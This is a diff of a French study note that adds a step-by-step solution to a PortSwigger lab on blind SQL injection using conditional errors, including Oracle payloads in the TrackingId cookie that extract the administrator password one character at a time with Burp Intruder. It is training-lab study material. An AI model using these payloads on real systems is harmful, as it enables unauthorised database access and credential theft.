@@ -56,7 +56,7 @@ statut: en cours
 
 ## Labs PortSwigger
 - [ ] Apprentice
-- [ ] Practitioner
+- [x] Practitioner ✅ 2026-11-02
 - [ ] Expert
 
 ## Journal des labs
@@ -69,11 +69,52 @@ La base de données contient une table appelée « users », comportant des colo
 
 Pour résoudre cet exercice, connectez-vous en tant qu’utilisateur administrateur.
 #### Solution
+**1. Confirmer l’injection**
+- Visitez la page d’accueil de la boutique et utilisez Burp Suite pour intercepter et modifier la requête contenant le cookie `TrackingId`. Pour simplifier, la valeur d’origine est `TrackingId=xyz`.
+- Ajoutez une apostrophe : `TrackingId=xyz'`. Vérifiez qu’un message d’erreur apparaît.
+- Mettez maintenant deux apostrophes : `TrackingId=xyz''`. Vérifiez que l’erreur disparaît. Cela suggère qu’une erreur de syntaxe (ici, l’apostrophe non fermée) a un effet détectable sur la réponse.
+- Il faut ensuite confirmer que le serveur interprète l’injection comme une requête SQL, et que l’erreur est bien une erreur de syntaxe SQL et non un autre type d’erreur. Pour cela, construisez d’abord une sous-requête en SQL valide : `TrackingId=xyz'||(SELECT '')||'`
+- La requête semble toujours invalide. Cela peut venir du type de base de données. Essayez avec un nom de table prévisible : `TrackingId=xyz'||(SELECT '' FROM dual)||'`
+- Comme l’erreur a disparu, la cible utilise probablement une base **Oracle**, qui exige que tout `SELECT` précise explicitement une table.
+- Testez ensuite une requête invalide tout en gardant une syntaxe SQL valide, par exemple une table inexistante : `TrackingId=xyz'||(SELECT '' FROM not-a-real-table)||'`
+- Cette fois, une erreur est renvoyée. Cela indique fortement que l’injection est traitée comme une requête SQL par le back-end.
 
+**2. Déduire des informations avec les erreurs**
+- Tant que vous injectez des requêtes syntaxiquement valides, la réponse d’erreur permet de déduire des informations sur la base.
+- Pour vérifier que la table `users` existe : `TrackingId=xyz'||(SELECT '' FROM users WHERE ROWNUM = 1)||'`
+- Pas d’erreur, donc la table existe. La condition `WHERE ROWNUM = 1` est importante : elle évite de renvoyer plus d’une ligne, ce qui casserait la concaténation.
 
-  
+**3. Tester des conditions**
+- Envoyez : `TrackingId=xyz'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'`. Une erreur est reçue.
+- Puis : `TrackingId=xyz'||(SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'`. L’erreur disparaît.
+- On peut donc déclencher une erreur conditionnellement à la vérité d’une condition. L’instruction `CASE` teste une condition et s’évalue à une expression si elle est vraie, à une autre si elle est fausse. La première contient une division par zéro, qui provoque l’erreur. Ici, les deux payloads testent `1=1` et `1=2`, et l’erreur survient quand la condition est vraie.
 
-_Traduit avec [DeepL.com](https://www.deepl.com/?utm_campaign=product&utm_source=web_translator&utm_medium=web&utm_content=copy_free_translation) (version gratuite)_
+**4. Vérifier l’existence de l’utilisateur**
+- `TrackingId=xyz'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'`
+- Vérifiez que la condition est vraie (l’erreur est reçue) : l’utilisateur `administrator` existe.
+
+**5. Déterminer la longueur du mot de passe**
+- Envoyez : `TrackingId=xyz'||(SELECT CASE WHEN LENGTH(password)>1 THEN to_char(1/0) ELSE '' END FROM users WHERE username='administrator')||'`
+- Cette condition doit être vraie : le mot de passe fait plus d’un caractère.
+- Testez ensuite `>2`, puis `>3`, et ainsi de suite. Vous pouvez le faire manuellement avec Burp Repeater, la longueur étant probablement courte.
+- Quand la condition cesse d’être vraie (l’erreur disparaît), vous avez la longueur : **20 caractères**.
+**6. Extraire chaque caractère avec Intruder**
+
+- Il faut ensuite tester le caractère de chaque position. Cela demande beaucoup de requêtes, donc utilisez Burp Intruder (envoyez la requête via le menu contextuel).
+- Dans Intruder, mettez ce cookie : `TrackingId=xyz'||(SELECT CASE WHEN SUBSTR(password,1,1)='a' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'`
+- `SUBSTR()` extrait un seul caractère du mot de passe pour le comparer à une valeur précise. L’attaque parcourt chaque valeur possible, une par une.
+- Placez les marqueurs de payload autour du dernier `a` : sélectionnez uniquement ce `a` et cliquez sur « Add § ». Le cookie devient : `TrackingId=xyz'||(SELECT CASE WHEN SUBSTR(password,1,1)='§a§' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'`
+- Dans le panneau « Payloads », vérifiez que « Simple list » est sélectionné. Sous « Payload configuration », ajoutez les valeurs de `a` à `z` et de `0` à `9` (vous pouvez le faire avec « Add from list »). On suppose que le mot de passe ne contient que des minuscules et des chiffres.
+- Lancez l’attaque avec « Start attack ».
+
+**7. Lire les résultats**
+- L’application renvoie un code HTTP **500** quand l’erreur se produit, et **200** normalement. La colonne « Status » permet de repérer facilement la ligne en 500. Le payload de cette ligne est le caractère à la première position.
+- Relancez l’attaque pour chaque autre position : dans l’onglet Intruder d’origine, changez l’offset de `1` à `2`, soit `SUBSTR(password,2,1)='§a§'`.
+- Lancez, relevez le caractère de la deuxième position, puis continuez avec les offsets 3, 4, etc., jusqu’à obtenir tout le mot de passe.
+
+**8. Terminer le lab**
+- Dans le navigateur, cliquez sur « My account » pour ouvrir la page de connexion et connectez-vous en tant que `administrator` avec le mot de passe trouvé.
+
 
 ## Liens
 - [[Access-control]]
